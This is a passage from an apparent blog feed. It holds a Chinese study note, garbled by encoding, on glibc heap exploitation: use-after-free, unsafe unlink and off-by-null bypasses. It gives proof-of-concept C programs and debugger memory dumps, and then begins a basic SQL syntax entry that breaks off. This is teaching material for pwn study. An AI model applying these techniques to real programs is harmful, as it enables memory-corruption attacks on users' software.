<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// è®¾ç½®sizeç½¢äº†</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// è®¾ç½®ä¸‹ä¸€ä¸ªchunkçš„prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s) Â  Â  Â  (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼šarenaçš„binsæ•°ç»„å­˜æ”¾æ•°æ®ï¼š</p>
<ul>
<li>è¿™æ ·æ¶‰åŠå°±å¥½åƒæœ‰fdï¼ŒbkæŒ‡é’ˆã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>ç›¸å…³çš„æ”»å‡»æ‰‹æ®µã€‚</p>
<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>æ—©æœŸå‘ç°æ­¤æ¼æ´æ—¶ï¼Œæ²¡æœ‰ <code>fd-&gt;bk != p || bk-&gt;fd != p</code> è¿™ä¸ªæ¡ä»¶ï¼Œå› æ­¤ç›´æ¥ä¿®æ”¹ fd, bk æ¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<ul>
<li>ä»»æ„åœ°å€å†™ï¼Œå¦‚æœå¼€äº† got è¡¨ä¿æŠ¤ï¼Œå¯ä»¥å†™ hookã€‚</li>
</ul>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>åœ¨æ²¡æœ‰ PIE å’Œ gotè¡¨å¯ä»¥å†™æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹gotè¡¨ã€‚å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªheap overflowè¿™æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚</p>
<ul>
<li>ä¸»è¦æ˜¯åˆ©ç”¨ unlink ä¸­çš„ä»£ç ï¼Œå…¶ä¸­æŒ‡é’ˆèµ‹å€¼ç®€åŒ–ä¸º <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
<li>æˆ‘ä»¬æ§åˆ¶è¿™ä¸ª p çš„å†…å®¹ã€‚</li>
</ul>
<ol>
<li>æŒ‰ç…§æ—¶é—´ malloc A,B</li>
<li>A å †æº¢å‡ºï¼Œä¿®æ”¹Açš„å†…å®¹ ä¿®æ”¹Bçš„header</li>
</ol>
<ul>
<li>target &#x3D; &amp;pï¼Œéœ€è¦æˆ‘ä»¬å¯ä»¥å†™ã€‚æˆ–è€… targetå°±æ˜¯p</li>
<li>æˆ‘ä»¬åœ¨ A é‡Œä¼ªé€ ä¸€ä¸ª fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li>
<li>åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹ B çš„headerï¼Œè®©fake free chunk å’Œ B å¯ä»¥åˆå¹¶ã€‚</li>
</ul>
<ol start="3">
<li>free B å°±ä¼š unlinkï¼Œ<strong>p å°±æ˜¯ fake free chunk</strong>ï¼Œè§¦å‘unlinkã€‚</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  Aä¸­ä¼ªé€  =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size è¿‡æ£€æŸ¥</span><br><span class="line">|   B     |                     |          |            prev_inuse ä¸º0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure>


<p>how2heap æ¡ˆä¾‹</p>
<ul>
<li>ç¼–è¯‘æ—¶æŒ‡å®šno-pie</li>
<li>æµ‹è¯•åœ¨ubuntu 22.04ï¼Œå¯ä»¥é€šè¿‡assert.</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 çš„ header æŒ‡é’ˆ</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse ä¸º 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink å‘ç”Ÿ</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// ä¿®æ”¹chunk0_ptr å¯ä»¥ä¿®æ”¹ *(chunk0_ptr - 0x18 )çš„å€¼</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒç»•ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥çœ‹æœ€åçš„ç»“æœï¼Œ<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>ã€‚target çš„å†…å®¹å­˜æ”¾ç€ <code>&amp;target-0x10</code> targetçš„åœ°å€å‡å»0x18</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr å †åœ°å€</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>ç»“è®ºï¼štarget æŒ‡é’ˆæŒ‡å‘ &amp;target-0x18ã€‚æˆ‘è§è¿‡çš„é—®é¢˜ä¸€èˆ¬åˆ©ç”¨åœ¨å…¨å±€æŒ‡é’ˆæ•°ç»„ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ä¿®æ”¹gotè¡¨å†…å®¹ã€‚<br>æ”¹<code>arr[0]</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹å’Œè¯»å– <code>arr[0]</code> ã€‚æ”¹æˆgotè¡¨ï¼Œè¯»å–å†…å®¹ï¼Œæ³„éœ²åœ°å€ï¼Œåˆå¯ä»¥ä¿®æ”¹å°±ç›´æ¥ä¿®æ”¹gotè¡¨å†…å®¹ã€‚<br><del>æ²¡æœ‰æ‰€æœ‰æƒçš„ç¼–ç¨‹æ˜¯è¿™æ ·çš„</del></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>ä¹Ÿæ˜¯å †æº¢å‡ºçš„ä¸€ç§å½¢å¼ï¼Œä½†è¿˜æ˜¯åŒºåˆ†ä¸€ä¸‹ã€‚åœ¨è¿™é‡Œå¯ä»¥æ”»å‡»ä¿æŠ¤å…¨å¼€çš„ç¨‹åºï¼Œä¸»è¦åˆ©ç”¨ç‚¹ä¸ºå †å¯ä»¥åˆå¹¶ã€‚</p>
<p>libc2.29 ä»¥å‰</p>
<ul>
<li>å…ˆé‡Šæ”¾chunk A.</li>
<li>é€šè¿‡chunk B,åˆ©ç”¨off by oneæ¼æ´åœ¨ ä¿®æ”¹chunk C presize å€¼ä¸º chunk A size +chunk B sizeçš„åŒæ—¶,å°†chunk Cçš„prev_inuseå€¼è¦†ç›–ä¸º0.</li>
<li>å†é‡Šæ”¾chunk Cã€‚</li>
</ul>
<p>libc2.29 ä»¥åæœ‰ä¸ªæ£€æŸ¥ï¼Œä¼šæ£€æŸ¥prev_chunk sizeæ˜¯å¦å’Œå½“å‰çš„ chunk çš„ prev_size ç›¸åŒï¼Œè€Œ off by nullï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ”¹å˜ chunk sizeï¼Œå› æ­¤æˆ‘ä»¬åœ¨chunké‡Œä¼ªé€ ä¸€ä¸ªchunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åçš„off by nullåˆ©ç”¨æ‰‹æ®µï¼Œå› ä¸ºæ²¡æœ‰arenaçš„æ£€æŸ¥ï¼Œåªæ˜¯æ£€æŸ¥äº†in_useä½å’Œsizeç›¸å…³æ£€æŸ¥</p>
<ul>
<li>ä¸‰ä¸ªå † Aï¼ŒBï¼ŒCï¼Œæœ€å¥½æ˜¯ 0x438 è¿™ç§ä¸æ˜¯æ•´æ•°ç±»å‹çš„ï¼Œä¼šå­˜åœ¨ä¸€æ®µå…¬ç”¨çš„ç»“æœã€‚cé˜²æ­¢ä¸top_chunkåˆå¹¶</li>
<li>ç¼–è¾‘Aï¼Œåœ¨Aä¸­<strong>ä¼ªé€ ä¸€ä¸ªå †</strong>ï¼Œè¦†ç›–æ‰Bçš„prev_inuse ä½</li>
<li>freeæ‰Bï¼Œå°±ä¼šå‘ååˆå¹¶ã€‚</li>
<li>ä½†æ˜¯éœ€è¦ç»•è¿‡unlink_chunkä¸­å¯¹fd, bkæ£€æŸ¥ <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>ã€‚</li>
</ul>
<p>ç®€å•ç‚¹çš„é¢˜ç›®ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªåŸºåœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åƒunlinkä¸€æ ·ä¿®æ”¹fd,bkå°±è¡Œ</p>
<ul>
<li>tcache leak åœ¨libc 2.32 éœ€è¦ <code>(fd&gt;&gt;12) ^ 0</code></li>
<li>unsorted bin å­˜åœ¨ä¸¤ä¸ªchunkï¼Œæ³„éœ²å…¶ä¸­ä¸€ä¸ªçš„ fd,bkå¯ä»¥å¾—åˆ°å †åœ°å€</li>
<li>largebin çš„å››ä¸ªæŒ‡é’ˆï¼Œåªæœ‰ä¸€ä¸ªchunkå¯ä»¥ä½¿ç”¨fd_nextsize å’Œ bk_nextsizeæŒ‡å‘è‡ªå·±</li>
</ul>
<p>åœ¨æ¯”è¾ƒè‹›åˆ»çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½æ³„éœ²å †åœ°å€ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¸ƒå±€heap fengshui è¿›è¡Œä¼ªé€ fake chunkã€‚å‡è®¾ç¨‹åºå­˜åœ¨off by null</p>
<ul>
<li>a-x-b-c-x-d-x, a,b,c,d å¤§å°éƒ½åœ¨unsorted biné‡Œï¼Œxæ˜¯é¿å…åˆå¹¶çš„chunk ï¼ˆc&gt;d&gt;a&#x3D;bï¼‰</li>
<li>free a, c, d æ‹¿fdæ¥è¯´å°±æ˜¯å½¢æˆ d-&gt;c-&gt;a-&gt;arena çš„é“¾è¡¨ã€‚</li>
<li>free b è¿™æ—¶å€™b,cåˆå¹¶ã€‚å˜æˆäº† b-&gt;d-&gt;a-&gt;arena é“¾è¡¨ï¼Œä½†æ˜¯è¿™æ—¶å€™cçš„æŒ‡é’ˆå¹¶æ²¡æœ‰æ¸…é™¤ã€‚</li>
<li>unsorted bin FIFOã€‚æ­¤å¤„éœ€è¦å°† aï¼Œdæ”¾å…¥largebiné‡Œï¼Œç„¶ååˆ‡å‰² b-cï¼Œç”Ÿæˆeï¼ŒeåŒ…å«cçš„ fd, bkæŒ‡é’ˆã€‚</li>
<li>æ¸…ç©ºunsorted bin è·å¾—f</li>
<li>ç¼–è¾‘ eï¼Œå¯ä»¥æ”¹åŸæ¥cä½ç½®çš„sizeï¼Œå¹¶ä¸”åŒæ—¶åŒ…å«äº†fd, bk æŒ‡é’ˆã€‚å› æ­¤æ­¤å¤„æˆ‘ä»¬éœ€è¦æ”¹ä¸€ç‚¹å®Œæˆunlinkä¸­çš„æ£€æŸ¥ã€‚</li>
<li>ä¹‹å‰chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;dã€‚å› ä¸ºå…¶æ”¾å…¥äº†largebiné‡Œ a-&gt;bk &#x3D; dï¼Œ d-&gt;fd &#x3D; aï¼Œæ— æ³•é€šè¿‡æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ»¡è¶³æ¡ä»¶</li>
<li>å°†a,dä»large bin æ‹¿å‡ºæ¥ã€‚</li>
<li>bypass bkæŒ‡é’ˆï¼šfree a, free fã€‚a-&gt;bk &#x3D; f, å°†aæ‹¿å‡ºæ¥ï¼Œä¸ä¼šæ¸…ç©ºæŒ‡é’ˆï¼Œä¿®æ”¹ä¸€ä¸‹bkæŒ‡é’ˆï¼Œå› ä¸ºfå’Œcè·ç¦»æ¯”è¾ƒè¿‘ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡partial writeä¿®æ”¹bk</li>
<li>bypass fdæŒ‡é’ˆ: ç›´æ¥å‘bypass bkä¸€æ ·ï¼ŒbkæŒ‡å‘çš„æ˜¯arenaã€‚free f, free dï¼Œd-&gt;fd&#x3D;fã€‚è®©åè®©å…¶è¿›å…¥largebiné‡Œï¼Œd-&gt;fd&#x3D;fã€‚æ‹¿å›då°±è¡Œ<ul>
<li>è¿™é‡Œä¸ºä»€ä¹ˆä¸åœ¨unsortbiné‡Œï¼šç›´æ¥æ‹¿å‡ºdï¼Œä¼šå…ˆå°†fæ”¾å…¥largebinï¼Œç„¶åd-&gt;arena å½¢æˆé“¾è¡¨ã€‚å…ˆæ‹¿få†æ‹¿å‡ºd, d-&gt;arenaé“¾è¡¨ã€‚éƒ½ç ´åäº†fdæŒ‡é’ˆï¼ˆæ²¡æœ‰æŒ‡å‘å †ã€‚</li>
</ul>
</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨è¿™æ®µä»£ç è°ƒè¯•ï¼Œæ²¡æœ‰æŒ‡é’ˆæ”¹å˜ï¼Œä¸»è¦çœ‹çš„æ˜¯å¯è¡Œæ€§ã€‚</p>
<ul>
<li>æœ€å¥½é‡æ–°åˆ†å¸ƒä¸€ä¸‹sizeï¼Œæœ€ç®€å•æ˜¯ä¿®æ”¹ <code>x0</code> å¤§å°ã€‚ä¿è¯få’Œc åªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚ä¸åŒ</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// åˆ‡å‰² b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// æ¸…é™¤unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin è·å¾— p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin è·å¾— p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>bk bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œbkéœ€è¦è¦†ç›–2byteæ‰è¡Œï¼Œå¯ä»¥ä¼˜åŒ–sizeï¼Œè®©å…¶åªè¦†ç›–1byteå°±è¡Œã€‚</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure>

<p>fd bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå°±æ˜¯fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul>
<li>kernel å­˜åœ¨å¾ˆå¤šçš„ list_head ç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <strong>æ¡ä»¶ç«äº‰</strong> æ¥ä¿®æ”¹æŒ‡é’ˆï¼Œå€ŸåŠ©å¦‚åŒ msg_msg ç»“æ„ä½“æ¥è¿›è¡Œä»»æ„åœ°å€å†™</li>
</ul>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul>
<li><a href="https://www.anquanke.com/post/id/197635">How2Heapå †åˆ©ç”¨å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰ï¼šUnsafe_unlink</a></li>
<li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-å †åŸºç¡€ä¹‹Unsafe Unlink)</a></li>
<li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨æ•°æ®åº“åŸºæœ¬è¯­æ³•</title>
    <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>ç®€å•å­¦ä¹ å¢åˆ æ”¹æŸ¥</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>ä¸‰ä¸ªæœ€å¹¿æ³›ä½¿ç”¨çš„å¼€æº RDBMSï¼šSQLiteã€MySQL å’Œ PostgreSQLã€‚å…³ç³»å‹æ•°æ®åº“</p>
</li>
<li><p>å› ä¸ºSQLçš„æ ‡å‡†ï¼Œä¸‰ä¸ªæ•°æ®åº“å·®ä¸å¤šçš„è¯­æ³•ã€‚</p>
</li>
</ul>
<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote>
<p>å…¶å®æ˜¯å¼€æº MariaDB</p>
</blockquote>
<p>æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure>

<p>è¡¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 